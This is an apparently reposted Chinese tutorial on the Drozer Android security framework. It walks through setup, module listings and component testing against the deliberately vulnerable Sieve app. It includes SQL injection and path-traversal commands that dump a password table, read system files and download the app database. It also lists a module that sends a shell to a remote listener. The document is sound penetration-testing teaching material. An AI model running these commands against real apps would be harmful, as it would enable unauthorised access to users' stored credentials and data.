<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/14846?u_atoken=5d61266fa579a603bb55b4b4da55e511&u_asession=01nsy7PIzboo6lsvo_i0vCb6GS9XMd4S2fEa7scnXLY_0Zq7Ih-RPuJBHeqgxrP2MvJB-YY_UqRErInTL5mMzm-GyPlBJUEqctiaTooWaXr7I&u_asig=05EsTO-fRzfy03c__KW0FbIIeMwCn1pfAVdBJ6EbIXEpMPclSk2Z2WOUam27EBXDWKZMSttNfN379Eqy0BSEB16xypu5koMP-hVa16YFuzSzloXvHnhWVgHEtEcKQHJ0_N90nfQU-VqHiAaOEdyY7UC28Fn6QtRJA9rMq5NOfXrNHBzhvSc0Kr8URjOX9Xe4tkfyP5jCDMqDWLTuoOowpmSkD3gpWRU3zdf535n98CHVTl4aua18BcAFJH_s51AicuHk3MH9mNwBe3ZN9Oub_VaVxUdaJm70ClCXtaFyL-tqJ6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=CAYf6v0st6sXb8oW2%2FueT7XJ%2BmQ%3D&time__1311=mqfx07G%3DiQDtK7KDsKg4CqiIWzrFGoq%3DF4D#toc-5)

> 先知社区，先知安全技术社区

### 文章前言

在近期做移动安全测试评估的时候发现对之前对移动安全测试框架 Drozer 的认知过于浅显，部分只是做了检测并没有做利用实践，同时命令也是在执行的时候不断地去查找，缺乏一个系统性的整理，而网上的文章也是零零碎碎没有一个较为系统的介绍和评估方法，遂即有了这篇文章

### 基本介绍

Drozer 是一款针对 Android 系统的安全测试框架，它由 console 和 server 两部分组成，其中 console 运行在本地计算机上，Server 安装在目标 Android 设备上来充当一个 Server，当使用 console 与 Android 设备交互时其实就是把 Java 代码输入到运行在实际设备上的 drozer 代理 (agent) 中

### 框架架构

Drozer 的框架架构主要分为以下几个部分：

*   Agent: Drozer Agent 是一个运行在 Android 设备上的应用程序，用于与 Drozer 服务器进行通信。它负责管理设备上的权限和数据访问，并向 Drozer 服务器提供所需的信息
*   Server: Drozer Server 是一个运行在安全评估者的计算机上的应用程序，它充当了与 Drozer Agent 通信的中介。服务器负责处理从 Agent 发送的请求，并将结果返回给 Agent
*   Console: Drozer Console 是安全评估者与 Drozer 框架交互的主要界面。通过 Drozer Console，用户可以执行各种命令来检测 Android 应用程序中的安全漏洞
*   Modules: Drozer 框架包含了一系列模块，每个模块用于执行特定的任务，例如发现应用程序中的漏洞、分析应用程序的权限等，这些模块可以通过 Drozer Console 进行调用和使用
*   Exploits: Drozer 框架还提供了一些用于利用已发现漏洞的 exploit 模块。这些 exploit 模块可以帮助评估者验证漏洞的危害性，并测试应用程序的安全性

### 环境搭建

Step 1：下载 Drozer，之后点击 setup.exe 傻瓜式安装即可  
链接：[https://pan.baidu.com/s/1NYBACOG7AUGdI42UJFaniw](https://pan.baidu.com/s/1NYBACOG7AUGdI42UJFaniw)  
提取码：hynw

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616104904-fe6cbb96-2b8a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616104904-fe6cbb96-2b8a-1.png)

Step 2：将下载的 agent.apk 拖拽到模拟器当中进行安装

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616104916-0577b206-2b8b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616104916-0577b206-2b8b-1.png)

之后启动 Drozer-agent

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616104925-0ad89670-2b8b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616104925-0ad89670-2b8b-1.png)  
Step 4：之后在 DOS 命令行中进行连接测试 (这里要在 Drozer 目录下面进行连接)，在这里我们首先测试 adb 是否可以使用

```
adb connect 127.0.0.1:62001

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616104944-16408234-2b8b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616104944-16408234-2b8b-1.png)  
PS：不同的模拟器 adb 链接端口也不一致，下面是常见的模拟器以及其对应的 adb 链接端口

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616104954-1c21dbda-2b8b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616104954-1c21dbda-2b8b-1.png)

这里 drozer Server 默然监听的为 31415 端口，所以需要在主机上同样与 31415 端口进行通信 本地电脑上调用 adb 执行以下命令进行端口转发：

```
adb forward tcp:31415 tcp:31415

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616105044-3a35422e-2b8b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616105044-3a35422e-2b8b-1.png)

之后使用 Drozer 连接

```
drozer console connect

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616105058-4242c0ea-2b8b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616105058-4242c0ea-2b8b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616105153-63089728-2b8b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616105153-63089728-2b8b-1.png)

### 使用方式

#### 基础使用

##### 帮助信息

在客户端命令行中执行 help 命令即可查阅 Drozer 的可用命令信息：

```
help

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616105234-7bcc0f1a-2b8b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616105234-7bcc0f1a-2b8b-1.png)

##### 命令详情

在客户端的命令行中输入 help + 命令的方式可以查看具体命令的使用方法，包括参数信息

```
#格式说明
help 命令

#简易实例
help cd

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616105252-86043264-2b8b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616105252-86043264-2b8b-1.png)

##### 模块列表

在客户端的命令行中输入 "list" 可以纤细的列出目前可用的模块，当然也可以使用 ls

```
list

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110305-f3aa6206-2b8c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110305-f3aa6206-2b8c-1.png)

```
dz> list
app.activity.forintent                   Find activities that can handle the given intent
app.activity.info                        Gets information about exported activities.
app.activity.start                       Start an Activity
app.broadcast.info                       Get information about broadcast receivers
app.broadcast.send                       Send broadcast using an intent
app.broadcast.sniff                      Register a broadcast receiver that can sniff particular intents
app.package.attacksurface                Get attack surface of package
app.package.backup                       Lists packages that use the backup API (returns true on FLAG_ALLOW_BACKUP)
app.package.debuggable                   Find debuggable packages
app.package.info                         Get information about installed packages
app.package.launchintent                 Get launch intent of package
app.package.list                         List Packages
app.package.manifest                     Get AndroidManifest.xml of package
app.package.native                       Find Native libraries embedded in the application.
app.package.shareduid                    Look for packages with shared UIDs
app.provider.columns                     List columns in content provider
app.provider.delete                      Delete from a content provider
app.provider.download                    Download a file from a content provider that supports files
app.provider.finduri                     Find referenced content URIs in a package
app.provider.info                        Get information about exported content providers
app.provider.insert                      Insert into a Content Provider
app.provider.query                       Query a content provider
app.provider.read                        Read from a content provider that supports files
app.provider.update                      Update a record in a content provider
app.service.info                         Get information about exported services
app.service.send                         Send a Message to a service, and display the reply
app.service.start                        Start Service
app.service.stop                         Stop Service
auxiliary.webcontentresolver             Start a web service interface to content providers.
exploit.jdwp.check                       Open @jdwp-control and see which apps connect
exploit.pilfer.general.apnprovider       Reads APN content provider
exploit.pilfer.general.settingsprovider  Reads Settings content provider
information.datetime                     Print Date/Time
information.deviceinfo                   Get verbose device information
information.permissions                  Get a list of all permissions used by packages on the device
scanner.activity.browsable               Get all BROWSABLE activities that can be invoked from the web browser
scanner.misc.native                      Find native components included in packages
scanner.misc.readablefiles               Find world-readable files in the given folder
scanner.misc.secretcodes                 Search for secret codes that can be used from the dialer
scanner.misc.sflagbinaries               Find suid/sgid binaries in the given folder (default is /system).
scanner.misc.writablefiles               Find world-writable files in the given folder
scanner.provider.finduris                Search for content providers that can be queried from our context.
scanner.provider.injection               Test content providers for SQL injection vulnerabilities.
scanner.provider.sqltables               Find tables accessible through SQL injection vulnerabilities.
scanner.provider.traversal               Test content providers for basic directory traversal vulnerabilities.
shell.exec                               Execute a single Linux command.
shell.send                               Send an ASH shell to a remote listener.
shell.start                              Enter into an interactive Linux shell.
tools.file.download                      Download a File
tools.file.md5sum                        Get md5 Checksum of file
tools.file.size                          Get size of file
tools.file.upload                        Upload a File
tools.setup.busybox                      Install Busybox.
tools.setup.minimalsu                    Prepare 'minimal-su' binary installation on the device.

```

##### 模块详情

在 Drozer 客户端命令行中输入 "help 模块名称" 后即可查看模块的使用方法

```
#命令格式
help 要查看的模块名称           

#简易实例
help app.activity.forintent

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110434-288616be-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110434-288616be-2b8d-1.png)

#### 应用评估

在 Drozer 客户端命令行中输入 "run 程序包名称" 后即可查看程序包对应的应用详情信息：

```
#列出程序包
run app.package.list

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110523-459e3664-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110523-459e3664-2b8d-1.png)

```
#获取已安装软件包的信息
run app.package.info

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110600-5c0d3daa-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110600-5c0d3daa-2b8d-1.png)

```
#查找可调试包
run app.package.debuggable

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110617-66028b80-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110617-66028b80-2b8d-1.png)

```
#查找具有共享uid的包
run app.package.shareduid

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110644-7666c0d6-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110644-7666c0d6-2b8d-1.png)

```
#列出使用备份API的包(在标记"允许备份"时返回true)
run app.package.backup

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110656-7d26e07c-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110656-7d26e07c-2b8d-1.png)

```
#获取包的启动意图
run app.package.launchintent com.android.browser

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110712-86d1130e-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110712-86d1130e-2b8d-1.png)

```
#获取包的AndroidManifest.xml
run app.package.manifest

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110724-8df4ec82-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110724-8df4ec82-2b8d-1.png)

```
#获取应用包的攻击面
run app.package.attacksurface package

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110736-95302c50-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110736-95302c50-2b8d-1.png)

```
#查找嵌入在应用程序中的本地库
run app.package.native package

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110745-9ad35f2e-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110745-9ad35f2e-2b8d-1.png)

#### 组件评估

##### Activity

```
#获取activity组件信息
run app.activity.info --package com.android.browser

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110821-b010d272-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110821-b010d272-2b8d-1.png)

```
#找到可以处理已指定的包
app.activity.forintent

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110838-ba5a786e-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110838-ba5a786e-2b8d-1.png)

```
# 获取可从web浏览器调用的所有可浏览的activity组件
run scanner.activity.browsable

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110851-c22ad246-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110851-c22ad246-2b8d-1.png)

```
#开启activity组件
app.activity.start

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110907-cbb030cc-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110907-cbb030cc-2b8d-1.png)

#### Service

```
#获取service组件信息
app.service.info

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110929-d8913eee-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110929-d8913eee-2b8d-1.png)

```
#向服务组件发送消息并显示应答
run app.service.send

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110944-e1667840-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110944-e1667840-2b8d-1.png)

```
#开启service组件
app.service.start

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616110959-ea46acb4-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616110959-ea46acb4-2b8d-1.png)

```
#停止service组件
app.service.stop

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111018-f5b5a988-2b8d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111018-f5b5a988-2b8d-1.png)

##### Content Provider

```
#获取Content Provider组件信息
app.provider.info

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111044-0541443e-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111044-0541443e-2b8e-1.png)

```
#查询Content Provider组件
app.provider.query

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111057-0d40c9de-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111057-0d40c9de-2b8e-1.png)

```
#在内容提供程序中列出列
app.provider.columns

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111116-18319bf2-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111116-18319bf2-2b8e-1.png)

```
#在内容提供程序中删除
app.provider.delete

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111135-2376b984-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111135-2376b984-2b8e-1.png)

```
#在内容提供程序中下载支持文件
app.provider.download

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111151-2d0ebf00-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111151-2d0ebf00-2b8e-1.png)

```
#在包中查找引用的内容URIS
app.provider.finduri

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111209-37d0efe4-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111209-37d0efe4-2b8e-1.png)

```
#插入到Content Provider组件中
app.provider.insert

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111411-807b0a54-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111411-807b0a54-2b8e-1.png)

```
#从支持文件的Content Provider读取
app.provider.read

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111426-899c5494-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111426-899c5494-2b8e-1.png)

```
#更新Content Provider的记录
app.provider.update

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111445-952b0602-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111445-952b0602-2b8e-1.png)

```
#搜索可从上下文中查询的Content Provider
scanner.provider.finduris

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111458-9c60fd8c-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111458-9c60fd8c-2b8e-1.png)

```
#测试Content Provider的注入漏洞
scanner.provider.injection

```

```
#测试Content Provider的注入漏洞
scanner.provider.injection

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111526-ad689298-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111526-ad689298-2b8e-1.png)

```
#查找可通过SQL注入漏洞访问的表
scanner.provider.sqltables

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111537-b3ba7378-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111537-b3ba7378-2b8e-1.png)

```
#测试Content Provider的基本目录遍历漏洞
scanner.provider.traversal

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111549-bb4678c6-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111549-bb4678c6-2b8e-1.png)

##### Broadcast Receivers

```
#获取有关广播接收器的信息
app.broadcast.info

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111613-c944e372-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111613-c944e372-2b8e-1.png)

```
#带目的发送广播
app.broadcast.send

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111638-d81b0e08-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111638-d81b0e08-2b8e-1.png)

```
#注册一个能嗅出特定意图的广播接收器
app.broadcast.sniff

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111657-e3b2eef2-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111657-e3b2eef2-2b8e-1.png)

### 安全示例

1、查找对应的包名 (/data/data 目录)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111712-ec5a5ee6-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111712-ec5a5ee6-2b8e-1.png)

2、列出详细 APP 信息

```
#命令格式
run app.package.info -a com.xxx.xxxx

#简易实例
run app.package.info -a com.mwr.example.sieve

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111726-f4c760e2-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111726-f4c760e2-2b8e-1.png)  
3、查看 APP 的配置信息

```
#命令格式
run app.package.manifest com.xxx.xxxx

#简易实例
run app.package.manifest com.mwr.example.sieve

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111740-fd11655e-2b8e-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111740-fd11655e-2b8e-1.png)  
4、应用攻击面查看

```
#命令格式
run app.package.attacksurface com.xxx.xxxx

#简易实例
run app.package.attacksurface com.mwr.example.sieve

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111755-05e1dc04-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111755-05e1dc04-2b8f-1.png)  
5、Activity 组件测试  
a、获取可导出的 Activity 组件列表

```
#命令格式
run app.activity.info -a com.xxx.xxxx

#简易示例 
run app.activity.info -a com.mwr.example.sieve

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111821-15726148-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111821-15726148-2b8f-1.png)  
b、通过调用 Activity 可导出的组件查看是否可以绕过部分权限校验

```
#命令格式：
run app.activity.start --component 软件包名 软件包名.对应exported的activtiy

#简易示例：
run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111837-1f46b246-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111837-1f46b246-2b8f-1.png)  
跳转实例：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111856-2a4a946e-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111856-2a4a946e-2b8f-1.png)  
6、Service 组件测试  
a、获取可以导出的 Service 组件信息

```
#命令格式 
run app.service.info -a com.xxx.xxxx

#简易示例 
run app.service.info -a com.mwr.example.sieve

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111911-33941766-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111911-33941766-2b8f-1.png)

b、发送 service 服务

```
#命令格式：
run app.service.start --component 软件包名 软件包名.对应exported的activtiy --extra 数据

#简易示例：
run app.service.start --component com.mwr.example.sieve com.mwr.example.sieve.AuthService --extra string phone 12345678901 --extra string content Hello

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111937-42a600f2-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111937-42a600f2-2b8f-1.png)  
7、Broadcast Receivers 测试  
a、获取可以导出的 Broadcast 信息

```
#命令格式 
run app.broadcast.info -a com.xxx.xxxx

#简易示例 
run app.broadcast.info -a com.mwr.example.sieve

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616111952-4be49a84-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111952-4be49a84-2b8f-1.png)  
b、注册一个能嗅出特定意图的广播接收器

```
#命令格式：
run app.broadcast.sniff --action "活动"

#简易示例：
run app.broadcast.sniff --action "ddns.actiton.Token"

```

c、发送广播

```
#命令格式：
run app.broadcast.send --action 广播名 --extra string name lisi

#简易示例：
run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 1234 --extra string message dog

```

8、获取 contentProvider 信息

```
#命令格式：
run app.provider.info -a com.xxx.xxxx

#简易示例：
run app.provider.info -a com.mwr.example.sieve

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616112025-5f556ada-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112025-5f556ada-2b8f-1.png)  
9、获取所有可访问的 Uri

```
#命令格式 
run scanner.provider.finduris -a

#简易示例 
run scanner.provider.finduris -a com.mwr.example.sieve

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616112040-683bdab2-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112040-683bdab2-2b8f-1.png)  
10、检测 SQL 注入

```
#命令格式 
run scanner.provider.injection -a com.xxx.xxxx

#简易示例 
run scanner.provider.injection -a com.mwr.example.sieve

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616112053-7073f3e0-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112053-7073f3e0-2b8f-1.png)

11、进行 SQL 注入

```
#命令格式
run app.provider.query [--projection] [--selection]

#简易示例 
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616112108-79551e58-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112108-79551e58-2b8f-1.png)

```
#列出所有表 
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616112118-7f248fc6-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112118-7f248fc6-2b8f-1.png)  
12、检测目录遍历

```
#命令格式
run scanner.provider.traversal -a com.xxx.xxxx

#简易示例 
run scanner.provider.traversal -a com.mwr.example.sieve

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616112132-87379ba4-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112132-87379ba4-2b8f-1.png)  
13、读取文件系统下的文件

```
#命令格式
run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts

#简易实例
run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616112143-8e4b76ea-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112143-8e4b76ea-2b8f-1.png)

14、下载数据库文件到本地

```
#简易示例 
run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db d:/database.db

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20240616112158-96c215a4-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112158-96c215a4-2b8f-1.png)

### 文末小结

Drozer 作为一款专注于 Android 应用安全评估的工具，其架构包括 Agent、Server、Console、Modules 和 Exploits 几个关键组件。Agent 在 Android 设备上运行，负责与 Drozer Server 通信并管理权限和数据访问；Server 则在评估者的计算机上运行，处理 Agent 发送的请求并返回结果；Console 为用户提供与 Drozer 框架交互的主要界面；Modules 则是执行各种安全评估任务的模块集合；而 Exploits 则提供了用于验证漏洞危害性的工具。通过这些组件的协作 Drozer 为安全评估者提供了强大的能力，帮助其发现和验证 Android 应用程序中的安全漏洞，本篇文章主要对 Drozer 的框架、基础命令  
、应用评估、组件评估、安全评估进行了全方位的介绍，算是移动安全评估中 Drozer 极为详细的总结性文章了，希望对各位读者有帮助~